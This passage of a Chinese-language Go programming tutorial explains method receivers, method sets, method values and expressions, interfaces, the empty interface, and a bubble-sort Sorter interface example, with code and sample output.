//这里的接收者本身就是一个指针，存放的就是内存地址，无需加取地址符 //取值还是需要加上星花符\u0026#34;*\u0026#34; fmt.Printf(\u0026#34;SetInfoPointer():p address:%p, p=%v\\n\u0026#34;, p, *p) } func main() { s := Person{\u0026#34;Go\u0026#34;, \u0026#39;M\u0026#39;, 11} fmt.Printf(\u0026#34;main(): s address:%p, s=%v\\n\u0026#34;, \u0026amp;s, s) //值语义 s.SetInfoValue(\u0026#34;C\u0026#34;, \u0026#39;M\u0026#39;, 42) //引用语义，取出内存地址当做参数传递过去 (\u0026amp;s).SetInfoPointer(\u0026#34;C\u0026#34;, \u0026#39;M\u0026#39;, 42) } /* 运行结果： main(): s address:0xc0000044a0, s={Go 77 11} SetInfoValue(): p address:0xc000004500, p={C 77 42} SetInfoPointer():p address:0xc0000044a0, p={C 77 42} */ SetInfoValue() 它绑定的接收者是一个普通类型，结构体默认是值传递，所以得到的是一份实参的拷贝，进了这个函数中，main() 中的实参和 SetInfoValue() 中的实参，各管各的了，互不相关。 SetInfoPointer() 它绑定的接收者是一个指针类型，需要的是一个内存地址的实参。得到了变量的内存地址，那么无论哪里修改，都是在修改内存地址中的值，一处修改影响原本的实参。\n3.5 方法集 类型的方法集是指：可以被该类型变量调用的所有方法的集合。 用一个变量（value/pointer）调用方法（含匿名字段）不受方法集约束，编译器总能够查找全部方法，并自动转换 receiver 实参。\n3.5.1 指针变量的方法集 结构体变量是一个指针变量，它能够调用哪些方法，这些方法就是一个集合，简称：方法集。 示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 type Person struct { name string sex byte //最终以ASCII码值的方式打印 age int } func (p Person) SetInfoValue() { fmt.Println(\u0026#34;SetInfoValue\u0026#34;) } func (p *Person) SetInfoPointer() { fmt.Println(\u0026#34;SetInfoPointer\u0026#34;) } func main() { //初始化一个指针变量 p := \u0026amp;Person{\u0026#34;Golang\u0026#34;, \u0026#39;M\u0026#39;, 11} //指针指向内存地址，所以用取地址符\u0026#34;\u0026amp;\u0026#34; p.SetInfoPointer() //指针变量理所当然能够调用指针接收者的方法 //SetInfoValue()的接收者是一个普通类型变量，但p是一个指针类型变量。此时，Golang内部就会做自动转换 //先把指针变量p，转换成(*p)，然后再调用。实际上它的操作就是 (*p).SetInfoValue() //实参p是一个指针类型变量，但接收者是一个普通类型变量，此时Golang内部就会自动转换 p.SetInfoValue() //经过内部转换，指针变量同时也能调用非指针接收者的方法 //这里手动显示转换，取值符把指针变量变成了普通变量，接收者也是一个普通变量，Golang不会去自动转换了，略微提高了性能 (*p).SetInfoValue() //手动把指针变量p，转换为普通变量p，也能调用 //Golang内部会去再次做转换 (*p).SetInfoPointer() //取值了，就变成了普通变量 } /* 运行结果： SetInfoPointer SetInfoValue SetInfoValue SetInfoPointer */ 3.5.2 普通变量的方法集 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 type Person struct { name string sex byte //最终以ASCII码值的方式打印 age int } func (p Person) SetInfoValue() { fmt.Println(\u0026#34;SetInfoValue\u0026#34;) } func (p *Person) SetInfoPointer() { fmt.Println(\u0026#34;SetInfoPointer\u0026#34;) } func main() { //普通变量 p := Person{\u0026#34;Golang\u0026#34;, \u0026#39;M\u0026#39;, 11} //指针指向内存地址，所以用取地址符\u0026#34;\u0026amp;\u0026#34; //内部先把普通变量p，转换为\u0026amp;p后再调用 //实际上它是 (\u0026amp;p).SetInfoPointer() p.SetInfoPointer() p.SetInfoValue() //p本身就是个普通变量，当然能掉普通接收者类型的方法 } /* 运行结果： SetInfoPointer SetInfoValue */ 3.5.3 方法集的总结 结构体变量要去调用方法，无需关心结构体变量是指针类型还是普通类型，Golang 非常智能，内部都会去做对应的转换，以适应最终的 ReceiverType。\n3.6 方法的匿名 使用了嵌入字段，同业也会将那个字段的方法引用过来。 示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 type Person struct { name string sex byte age int } //给Person结构体绑定一个方法 func (p *Person) PrintInfo() { fmt.Printf(\u0026#34;name=%s, sex=%c, age=%d\\n\u0026#34;, p.name, p.sex, p.age) } //Student引用Person结构体 type Student struct { Person //匿名字段 stuNo int address string } func main() { s := Student{Person{\u0026#34;Go\u0026#34;, \u0026#39;M\u0026#39;, 11}, 1010, \u0026#34;Google Inc.\u0026#34;} //Student结构体引用Person，Person中有PrintInfo()方法，因此Student结构体变量也可以直接调用 s.PrintInfo() } /* 运行结果： name=Go, sex=M, age=11 */ Student 有对 Person 结构体的引用，Person 结构体绑定了一个方法，既然 Student 引用了 Person 这个结构体，那么同时也会得到 Person 所有的属性和方法。\n3.7 同名方法 在 3.3.2 中已经提及过这个概念，接收者不一样，就算方法名一样，那么也是两个不同的方法，只是看起来名字一样而已。查找规则跟作用域原则一致！ 示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 type Person struct { name string sex byte age int } func (p *Person) PrintInfo() { fmt.Printf(\u0026#34;*Person=%+v\\n\u0026#34;, *p) } type Student struct { Person //匿名字段 stuNo int address string } func (s *Student) PrintInfo() { fmt.Printf(\u0026#34;*Student=%+v\\n\u0026#34;, *s) } func main() { s := Student{Person{\u0026#34;Go\u0026#34;, \u0026#39;M\u0026#39;, 11}, 1010, \u0026#34;Google Inc.\u0026#34;} //查找规则跟作用域原则的一样，先找自己本身 s.PrintInfo() //只想调用Person的那个PrintInfo()，就需要显示调用 s.Person.PrintInfo() } /* 运行结果： *Student={Person:{name:Go sex:77 age:11} stuNo:1010 address:Google Inc.} *Person={name:Go sex:77 age:11} */ 3.8 方法值和方法表达式 3.8.1 方法值 本质上是方法的字面量，将方法的入口（可以简单理解成：函数体）赋值给一个变量，变量保存了这个方法的入口，可以直接使用变量名()方式调用。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 type Person struct { name string sex byte age int } func (p Person) SetValue() { fmt.Printf(\u0026#34;SetValue: p address=%p, p=%+v\\n\u0026#34;, \u0026amp;p, p) //普通类型变量，格式化地址值需要加取地址符\u0026#34;\u0026amp;\u0026#34; } func (p *Person) SetPointer() { fmt.Printf(\u0026#34;SetPointer: p address=%p, p=%+v\\n\u0026#34;, p, p) //p本身就是指针类型 } func main() { p := Person{\u0026#34;Go\u0026#34;, \u0026#39;M\u0026#39;, 11} fmt.Printf(\u0026#34;main: p address=%p, p=%+v\\n\u0026#34;, \u0026amp;p, p) p.SetPointer() //传统调用方式 pFunc := p.SetPointer //将方法的入口赋值给变量，变量就保存了该方法。这个就是方法值，调用方法时无需再传接收者，因为已经隐藏了接收者 pFunc() //pFunc这个变量保存了一个方法，可以直接加圆括号调用。等价于 p.SetPointer() //普通数据类型使用方法值也是一样的操作 vFunc := p.SetValue //将方法的入口赋值给一个变量，隐藏了接收者 vFunc() //等价于 p.SetValue() } /* 运行结果： main: p address=0xc0000044a0, p={name:Go sex:77 age:11} SetPointer: p address=0xc0000044a0, p=\u0026amp;{name:Go sex:77 age:11} SetPointer: p address=0xc0000044a0, p=\u0026amp;{name:Go sex:77 age:11} SetValue: p address=0xc000004540, p={name:Go sex:77 age:11} */ 3.8.2 方法表达式 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 type Person struct { name string sex byte age int } func (p Person) SetValue() { fmt.Printf(\u0026#34;SetValue: p address=%p, p=%+v\\n\u0026#34;, \u0026amp;p, p) //普通类型变量，格式化地址值需要加取地址符\u0026#34;\u0026amp;\u0026#34; } func (p *Person) SetPointer() { fmt.Printf(\u0026#34;SetPointer: p address=%p, p=%+v\\n\u0026#34;, p, p) //p本身就是指针类型 } func main() { p := Person{\u0026#34;Go\u0026#34;, \u0026#39;M\u0026#39;, 11} fmt.Printf(\u0026#34;main: p address=%p, p=%+v\\n\u0026#34;, \u0026amp;p, p) f1 := (*Person).SetPointer //接收者是指针类型，就需要加上星花符\u0026#34;*\u0026#34; f1(\u0026amp;p) //显示地把实参传递给接收者，等价于 p.SetPointer() f2 := (Person).SetValue //接收者是普通数据类型 f2(p) //显示地把变量传递给接收者 } /* 运行结果： main: p address=0xc0000044a0, p={name:Go sex:77 age:11} SetPointer: p address=0xc0000044a0, p=\u0026amp;{name:Go sex:77 age:11} SetValue: p address=0xc000004520, p={name:Go sex:77 age:11} */ 3.8.3 两者的区别 方法值把接收者的实参给隐藏了起来，方法表达式需要显示传参，只是写法上的不同而已。本质上都是保存了方法的入口，让变量变成一个方法字面量。\n四、接口 接口实现了\u0026quot;多态\u0026quot;的思想。接口跟结构体很像，结构体里面放的是成员（属性）、变量，接口里面放的是方法（实际上就是函数）的声明，方法由其他类型实现。 在 Golang 中，接口 interface 是一个自定义类型，接口类型具体描述了一系列方法的集合。（方法由其他类型定义） 接口类型只会展示出它们自己的方法，它不会暴露出它所代表的内部值的结构和支持的基础操作的集合。 Golang 的接口实现了鸭子类型 duck-typing，我不关心这只动物到底是鸟还是鸭子还是鸵鸟，我只要看到它走起来像鸭子、游泳起来像鸭子或者叫起来像鸭子，那么这只动物就是鸭子。总结：不关心数据类型，只关心行为。不关心最终由哪个类型来实现，只关心最终实现了什么行为！\n4.1 接口声明 基本语法：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 type Humaner interface { SayHi() ReturnType } 123 ```go 注意事项： 1.接口命名习惯以 `er` 结尾。 2.接口只有方法声明，没有实现，没有数据字段。 3.接口可以匿名嵌入其他接口，或嵌入到结构中。 4.声明带返回值的方法时，把返回值类型写在方法名的小括号后面。 ### 4.2 接口实现 接口是用来定义行为（方法）的类型。这些被定义的行为不由接口直接实现，而是由用户定义的类型实现。 如果用户定义的类型实现了某个接口类型声明的一组方法，那么这个用户定义的类型的值就可以赋值给这个接口类型的值。这个赋值会把用户定义的类型的值存入接口类型的值。 示例： ```go //定义接口类型 type Humaner interface { //方法的声明，没有实现，由别的类型（自定义类型）实现 sayhi() } type Student struct { name string stuNo int } //Student类型实现了sayhi()方法 func (s *Student) sayhi() { fmt.Printf(\u0026#34;Student[%s, %d], say hi.\\n\u0026#34;, s.name, s.stuNo) } type Teacher struct { address string group string } //Teacher类型实现了sayhi()方法 func (t *Teacher) sayhi() { fmt.Printf(\u0026#34;Teacher[%s, %s], say hi.\\n\u0026#34;, t.address, t.group) } type MyStr string func (s *MyStr) sayhi() { fmt.Printf(\u0026#34;MyStr[%s], say hi.\\n\u0026#34;, *s) //取地址中的值，需要星花符\u0026#34;*\u0026#34; } func main() { //定义接口类型的变量 var i Humaner //i的类型是Humaner接口 //只要实现了此接口方法的类型，那么这个类型的变量（接收者类型）就可以赋值给接口的变量 s := \u0026amp;Student{\u0026#34;Go\u0026#34;, 1010} //接收者是指针类型，需要取出内存地址 i = s i.sayhi() t := \u0026amp;Teacher{\u0026#34;Google Inc.\u0026#34;, \u0026#34;Go\u0026#34;} i = t i.sayhi() //把接口类型赋值给自定义类型 var str MyStr = \u0026#34;hello go\u0026#34; //需要显示写上MyStr类型，没有写，就会默认推导成字符串类型。字符串类型和MyStr类型，不是同一个类型 i = \u0026amp;str i.sayhi() } /* 运行结果： Student[Go, 1010], say hi. Teacher[Google Inc., Go], say hi. MyStr[hello go], say hi. */ 同一个接口实现了不同的表现，就看给接口类型的变量，赋值了一个什么类型。 大致流程分析： 首先：声明了一个接口类型，这个接口类型中有一个叫 sayhi() 的方法。接口类型只有方法的声明，没有方法的实现以及其他任何属性、变量。 接下来：每一个结构体都实现了该方法。以 func (s *Student) sayhi() {...} 为例，sayhi 中实现了一些行为（说白了就是写了些代码，要 *Student 这个类型干些什么事情），并绑定到了 *Student 类型中。 紧接着：定义了一个接口变量 i，\u0026amp;Student 赋值给了 i（因为 Student 的接收者类型是一个指针类型，所以需要传递一个内存地址给它）。调用 i.sayhi() 的时候，就会去找 \u0026amp;Student 中的那个 sayhi() 方法。 同理：Teacher 的地址重新赋值给了 i，再次调用 i.sayhi() 的时候，就会去找 \u0026amp;Teacher 中的那个 sayhi() 方法。 最后：自定义类型 MyStr 的变量 \u0026amp;str 赋值给了i，调用的时候就会去找 \u0026amp;MyStr 中的那个 sayhi() 方法。注意：MyStr 一定要显示写法，不写的话，str 就会被自动推导成为 string 类型。string 类和 MyStr 类型，根本不是同一个数据类型，肯定会报错！ 总结：就看给接口变量赋值了什么类型的变量，根据赋值的变量类型，自动选择赋值变量类型所匹配的方法。\n4.3 调用同一个函数，实现不同行为 示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 //定义接口类型 type Humaner interface { //方法的声明，没有实现，由别的类型（自定义类型）实现 sayhi() } type Student struct { name string stuNo int } //Student类型实现了sayhi()方法 func (s *Student) sayhi() { fmt.Printf(\u0026#34;Student[%s, %d], say hi.\\n\u0026#34;, s.name, s.stuNo) } type Teacher struct { address string group string } //Teacher类型实现了sayhi()方法 func (t *Teacher) sayhi() { fmt.Printf(\u0026#34;Teacher[%s, %s], say hi.\\n\u0026#34;, t.address, t.group) } type MyStr string func (s *MyStr) sayhi() { fmt.Printf(\u0026#34;MyStr[%s], say hi.\\n\u0026#34;, *s) } //定义一个函数，接收接口类型的参数，一种接口实现多种行为 //参数接收一个实现了Humaner接口类型中sayhi()方法的变量 func WhoSayHi(i Humaner) { i.sayhi() } func main() { s := \u0026amp;Student{\u0026#34;Go\u0026#34;, 1010} t := \u0026amp;Teacher{\u0026#34;Google Inc.\u0026#34;, \u0026#34;Go\u0026#34;} var str MyStr = \u0026#34;hello go\u0026#34; //需要显示写上MyStr类型，没有写，就会默认推导成字符串类型。string类型和MyStr类型，不是同一个类型 //下面3次调用同一个函数，但实现了不同的表现行为 WhoSayHi(s) //WhoSayHi的参数是一个普通接口类型，但结构体接收者的类型是*Student，所以s的类型需要是一个指针类型（内存地址） WhoSayHi(t) WhoSayHi(\u0026amp;str) fmt.Println(\u0026#34;-----------------------------\u0026#34;) //创建一个切片，数据类型是Humaner接口类型 //此例中的变量只有3个，长度千万不要超了，不然第4个开始，就是空指针了，会报错！除非再另外赋值新的变量并加入到切片中 hs := make([]Humaner, 3) hs[0] = s hs[1] = t hs[2] = \u0026amp;str for _, i := range hs { //每个i都是实现了Humaner接口类型的结构体变量 WhoSayHi(i) //两者写法等价 i.sayhi() //两者写法等价 } } /* 运行结果： Student[Go, 1010], say hi. Teacher[Google Inc., Go], say hi. MyStr[hello go], say hi. ----------------------------- Student[Go, 1010], say hi. Student[Go, 1010], say hi. Teacher[Google Inc., Go], say hi. Teacher[Google Inc., Go], say hi. MyStr[hello go], say hi. MyStr[hello go], say hi. */ 简单理解：func WhoSayHi(i Humaner) { i.sayhi() }这段代码中，i Humaner 不需要关心传过来的变量类型是什么，它只看那个变量有没有实现了 sayhi() 方法。只要传过来的变量中实现了 sayhi() 方法，那么Golang就会自行去查找该变量中的函数。如果该变量中没有实现 sayhi() 方法，让 Golang 怎么能找得到？\n4.4 接口组合 接口组合的两种表现形式：接口嵌入、接口转换。\n4.4.1 接口嵌入 如果一个 interface1 作为 interface2 的一个嵌入字段，那么 interface2 隐式地包含了 interface1 里面的所有方法。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 type Humaner interface { sayhi() } type Songster interface { Humaner //引用了Humaner这个接口，同时也包含了Humaner接口中的方法 sing(lrc string) } type Student struct { name string stuNo int } //Student实现Humaner中的sayhi()方法 func (s *Student) sayhi() { fmt.Printf(\u0026#34;Student[%s, %d], sayhi.\\n\u0026#34;, s.name, s.stuNo) } //Student同时也实现了sing()这个方法，定义时有参数，实现的时候也必须对应带上参数 func (s *Student) sing(lrc string) { fmt.Printf(\u0026#34;Student %s, is sing: %s\\n\u0026#34;, s.name, lrc) } func main() { var i Songster //声明一个接口类型的变量 //结构体的接收者是个指针类型，所以需要给它一个内存地址 s := \u0026amp;Student{\u0026#34;xxxyyy\u0026#34;, 999} i = s i.sayhi() //Songster接口嵌入了Humaner接口，Humaner接口中有sayhi()方法，那么Songster接口也会有这个方法 i.sing(\u0026#34;god is a girl\u0026#34;) //Songster接口自己独有的方法 } /* 运行结果： Student[xxxyyy, 999], sayhi. Student xxxyyy, is sing: god is a girl */ Songster 接口中嵌入了 Humaner 接口，那么 Songster 就会得到 Humaner 接口中的所有方法。只需要实现 Songster 接口中的方法即可！ 还有一个更加简洁的写法，修改上述 main() 中的代码成如下：\n1 2 3 4 5 6 7 func main() { //结构体的接收者是个指针类型，所以需要给它一个内存地址 s := \u0026amp;Student{\u0026#34;xxxyyy\u0026#34;, 999} s.sayhi() //Songster接口嵌入了Humaner接口，Humaner接口中有sayhi()方法，那么Songster接口也会有这个方法 s.sing(\u0026#34;god is a girl\u0026#34;) //Songster接口自己独有的方法 } 运行结果一模一样，大致流程：结构体 Student 已经实现了 sayhi() 和 sing(lrc string) 这两个方法，那么就绑定在了一起。只需要有这个结构体类型的变量，即可找到它已经实现的这两个方法。\n4.4.2 接口转换 需要配合接口嵌入来使用。如果 interface2 嵌入了 interface1，那么 interface2 就可以转换给 interface1，因为 interface2 中即包含了它自己本身的方法也包含了 interface1 的方法；而 interface1 不能转换给 interface2，因为 interface1 没有嵌入 interface2，就没有 interface2 中的方法，所以不能转换。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 type Humaner interface { sayhi() } type Songster interface { Humaner //引用了Humaner这个接口，同时也包含了Humaner接口中的方法 sing(lrc string) } type Student struct { name string stuNo int } //Student实现Humaner中的sayhi()方法 func (s *Student) sayhi() { fmt.Printf(\u0026#34;Student[%s, %d], sayhi.\\n\u0026#34;, s.name, s.stuNo) } //Student同时也实现了sing()这个方法，定义时有参数，实现的时候也必须对应带上参数 func (s *Student) sing(lrc string) { fmt.Printf(\u0026#34;Student %s, is sing: %s\\n\u0026#34;, s.name, lrc) } func main() { var i1 Humaner var i2 Songster i1 = i2 fmt.Println(\u0026#34;i1=\u0026#34;, i1) } /* 运行结果： i1= \u0026lt;nil\u0026gt; */ 上例中，Songster 接口嵌入了 Humaner 接口，所以 Songster 接口即有自己的方法又有 Humaner 的方法，Songster 可以转换给 Humaner；Humaner 没有 Songster 中的方法，所以不能把 Humaner 给 Songster 。 如果把 Songster 给了 Humaner，就会报错：\n1 2 3 4 5 6 7 func main() { var i1 Humaner var i2 Songster i2 = i1 //报错：Humaner does not implement Songster (missing sing method) ===\u0026gt; Humaner没有实现Songster，缺少sing方法 fmt.Println(\u0026#34;i2=\u0026#34;, i2) } 可以用另外一种更加简洁的概念来理解：超集 子集。超集就是方法数量多的那个接口，子集就是方法数量少的那个接口。超集可以给子集，子集不能给超集 详看下例代码的注释：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 //子集：这个接口的方法数量少 type Humaner interface { sayhi() } //超集：这个接口的方法数量多 type Songster interface { Humaner //引用了Humaner这个接口，同时也包含了Humaner接口中的方法 sing(lrc string) } type Student struct { name string stuNo int } func (s *Student) sayhi() { fmt.Printf(\u0026#34;Student[%s, %d], sayhi.\\n\u0026#34;, s.name, s.stuNo) } func (s *Student) sing(lrc string) { fmt.Printf(\u0026#34;Student %s, is sing: %s\\n\u0026#34;, s.name, lrc) } func main() { var i1 Humaner //子集 var i2 Songster //超集 //超集可以给子集 i1 = i2 fmt.Println(\u0026#34;i1=\u0026#34;, i1) } /* 运行结果： i1= \u0026lt;nil\u0026gt; */ 代码能编得过，没有问题。\n4.5 空接口 空接口 interface({}) 不包含任何方法，可以接收任意类型。正因为如此，所有的类型都实现了空接口，空接口可以存储任意类型的数值。空接口就是个万能类型，能够保存任意类型的值。\n4.5.1 可以给空接口类型赋任意类型的值 示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 type Any interface{} //any或Any，是空接口一个很好的别名或缩写 type Person struct { name string age int } func main() { var any Any //空接口可以给任何值 any = 123 fmt.Printf(\u0026#34;any type is: %T, value = %v\\n\u0026#34;, any, any) any = \u0026#34;Golang\u0026#34; fmt.Printf(\u0026#34;any type is: %T, value = %v\\n\u0026#34;, any, any) any = true fmt.Printf(\u0026#34;any type is: %T, value = %v\\n\u0026#34;, any, any) any = Person{\u0026#34;Golang\u0026#34;, 11} fmt.Printf(\u0026#34;any type is: %T, value = %v\\n\u0026#34;, any, any) any = \u0026amp;Person{\u0026#34;Rob Pike\u0026#34;, 55} fmt.Printf(\u0026#34;any type is: %T, value = %v\\n\u0026#34;, any, any) } /* 运行结果： any type is: int, value = 123 any type is: string, value = Golang any type is: bool, value = true any type is: main.Person, value = {Golang 11} any type is: *main.Person, value = \u0026amp;{Rob Pike 55} */ 4.5.2 Print()系列函数的参数列表就是空接口类型 当函数可以接收任意类型的时候，我们会将其参数类型声明为：空接口 interface{} 类型。最经典的例子就是标准库 fmt 中 Print 系列的函数。 示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 func main() { var v1 interface{} = 1 var v2 interface{} = \u0026#34;Google\u0026#34; var v3 interface{} = \u0026amp;v2 var v4 interface{} = struct{ X int }{1} var v5 interface{} = \u0026amp;struct{ X int }{1} fmt.Printf(\u0026#34;v1=%v, v2=%v, v3=%v, v4=%v, v5=%v\\n\u0026#34;, v1, v2, v3, v4, v5) } /* 运行结果： v1=1, v2=Google, v3=0xc0000341f0, v4={1}, v5=\u0026amp;{1} */ 标准库 fmt 中 Println() 函数的定义：func Println(a ...interface{}) (n int, err error)，它的参数就是可以接收 0 个或多个的任意类型参数。\n4.5.3 map[string]interface{} 演示 利用 interface{} 可以存放任意类型的值，这个特性。实现 map 多种数据类型的存储、读取。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 func main() { m := make(map[string]interface{}) m[\u0026#34;int\u0026#34;] = 123 m[\u0026#34;string\u0026#34;] = \u0026#34;hello\u0026#34; m[\u0026#34;bool\u0026#34;] = true m[\u0026#34;float64\u0026#34;] = 123.111 m[\u0026#34;nil\u0026#34;] = nil m[\u0026#34;slice\u0026#34;] = []int{1, 2, 3} m2 := make(map[string]int) m2[\u0026#34;aaa\u0026#34;] = 0 m[\u0026#34;map\u0026#34;] = m2 // 在 map 中，嵌套另一个 map for key, value := range m { fmt.Printf(\u0026#34;key=%s, value=%v\\n\u0026#34;, key, value) } } /* 运行结果： key=string, value=hello key=bool, value=true key=float64, value=123.111 key=nil, value=\u0026lt;nil\u0026gt; key=slice, value=[1 2 3] key=map, value=map[aaa:0] key=int, value=123 */ map 是无序的，所以每次打印结果的顺序都有可能不同。 参考文献：\nhttps://github.com/fengchunjian/goexamples/blob/master/map_interface/null_interface.go http://blog.ninja911.com/blog-show-blog_id-76.html\n4.6 示例：使用 Sorter 接口排序 编写一个接口，实现对不同数据类型的冒泡排序。 要对一组数字或字符串排序，只需要实现三个方法： 1.反映元素个数的 Len() 方法。 2.比较第 i 和 j 个元素的 Less(i, j) 方法。 3.交换第 i 和 j 个元素的 Swap(i, j) 方法。\n4.6.1 目录结构 XXX\n4.6.2 编写接口的代码 编写一个接口，实现排序时，传过去的实参是这个接口类型。 ./sort/sort.go 文件的代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 package sort //声明接口，并声明需要实现的3个方法 type Sorter interface { Len() int Less(i, j int) bool Swap(i, j int) } //实现冒泡排序的函数 func Sort(data Sorter) { //参数为接口类型 for pass := 1; pass \u0026lt; data.Len(); pass++ { //data.Len()，获取该类型的长度 for i := 0; i \u0026lt; data.Len()-pass; i++ { //比较两个数值的大小 if data.Less(i+1, i) { data.Swap(i, i+1) //实现交换 } } } } //检测是否已实现了排序 func IsSorted(data Sorter) bool { n := data.Len() for i := n - 1; i \u0026gt; 0; i-- { if data.Less(i, i-1) { return false } } return true } //声明IntArray变量为，切片类型存放int type IntArray []int //IntArray类型实现接口中的Len()方法，接收者为普通参数 func (p IntArray) Len() int { return len(p) } //IntArray类型实现接口中的Less(i, j int)bool方法，接收者为普通参数 func (p IntArray) Less(i, j int) bool { return p[i] \u0026lt; p[j] } //IntArray类型实现接口中的Swap(i, j int)方法，接收者为普通参数 func (p IntArray) Swap(i, j int) { p[i], p[j] = p[j], p[i] } //定义StringArray变量为，切片类型存放字符串 type StringArray []string func (p StringArray) Len() int { return len(p) } func (p StringArray) Less(i, j int) bool { return p[i] \u0026lt; p[j] } func (p StringArray) Swap(i, j int) { p[i], p[j] = p[j], p[i] } //对一个int切片进行排序 func SortInts(a []int) { Sort(IntArray(a)) //将a转换为IntArray类型 } //对一个string切片进行排序 func SortStrings(a []string) { Sort(StringArray(a)) //将a转换为StringArray类型 } func IntsAreSorted(a []int) bool { return IsSorted(IntArray(a)) } func StringsAreSorted(a []string) bool { return IsSorted(StringArray(a)) } 4.6.3 实现：不同数据类型调用同一个接口，完成排序 ./main.go 文件的代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 package main import ( \u0026#34;fmt\u0026#34; \u0026#34;gitee.com/quanquan616/mySorter/sort\u0026#34; ) func ints() { //初始化一个切片，里面存放int值 data := []int{74, 59, 238, -784, 9845, 959, 905, 0, 0, 42, 7586, -5467984, 7586} //将这个切片类型，转换为IntArray类型 a := sort.IntArray(data) //因为IntArray类型已经实现了Sorter接口中的所有方法 //经过上一步的转换，此时a已经是IntArray类型，所以它与Sorter接口类型吻合 sort.Sort(a) if !sort.IsSorted(a) { panic(\u0026#34;failed.\u0026#34;) } fmt.Printf(\u0026#34;The sorted array is: %v\\n\u0026#34;, a) } func strings() { //初始化一个切片，存放string值 data := []string{\u0026#34;barry\u0026#34;, \u0026#34;quanquan616\u0026#34;, \u0026#34;Rita\u0026#34;, \u0026#34;rita\u0026#34;, \u0026#34;Barry\u0026#34;, \u0026#34;sally\u0026#34;, \u0026#34;Golang\u0026#34;, \u0026#34;Sally\u0026#34;} //将切片转换成StringArray类型 a := sort.StringArray(data) //StringArray类型也已经实现了Sorter接口的所有方法 //所以a的类型可以被Sorter接口类型所接收 sort.Sort(a) if !sort.IsSorted(a) { panic(\u0026#34;failed.\u0026#34;) } fmt.Printf(\u0026#34;The sorted array is: %v\\n\u0026#34;, a) } //根据结构体day中的num进行排序 type day struct { num int shortName string longName string } type dayArray struct { data []*day //声明data字段的类型为切片，存放day的指针变量 } //dayArray类型实现Len()方法，接收者为指针类型 func (p *dayArray) Len() int { //p是一个结构体类型，里面有一个data字段，data字段是一个切片类型 //p.data操作是取出那个一整个切片 return len(p.data) } func (p *dayArray) Less(i, j int) bool { //接收者为指针类型 //p.data操作得到了一个切片，既然是切片类型就能使用索引进行取值 return p.data[i].num \u0026lt; p.data[j].num } func (p *dayArray) Swap(i, j int) { //接收者为指针类型 p.data[i], p.data[j] = p.data[j], p.data[i] } func days() { Sunday := day{0, \u0026#34;SUN\u0026#34;, \u0026#34;Sunday\u0026#34;} Monday := day{1, \u0026#34;MON\u0026#34;, \u0026#34;Monday\u0026#34;} Tuesday := day{2, \u0026#34;TUE\u0026#34;, \u0026#34;Tuesday\u0026#34;} Wednesday := day{3, \u0026#34;WED\u0026#34;, \u0026#34;Wednesday\u0026#34;} Thursday := day{4, \u0026#34;THU\u0026#34;, \u0026#34;Thursday\u0026#34;} Friday := day{5, \u0026#34;FRI\u0026#34;, \u0026#34;Friday\u0026#34;} Saturday := day{6, \u0026#34;SAT\u0026#34;, \u0026#34;Saturday\u0026#34;} //初始化一个切片，存放day的指针变量 //结构体dayArray类型中的data字段的类型为切片，切片中存放的数据类型为day的指针变量 data := []*day{\u0026amp;Tuesday, \u0026amp;Thursday, \u0026amp;Wednesday, \u0026amp;Sunday, \u0026amp;Monday, \u0026amp;Friday, \u0026amp;Saturday} a := dayArray{data} //dayArray的数据类型是一个结构体，结构体的语法是大括号\u0026#34;{}\u0026#34;写法 sort.Sort(\u0026amp;a) //接收者是指针类型，需要一个合法指向。所以必须取地址，把地址的值传过去 if !sort.IsSorted(\u0026amp;a) { panic(\u0026#34;days sort failed.\u0026#34;) } for _, d := range data { fmt.Printf(\u0026#34;%s \u0026#34;, d.longName) } fmt.Println() } func main() { ints() strings() days() } 4.6.4 最终运行结果 1 2 3 4 运行结果： The sorted array is: [-5467984 -784 0 0 42 59 74 238 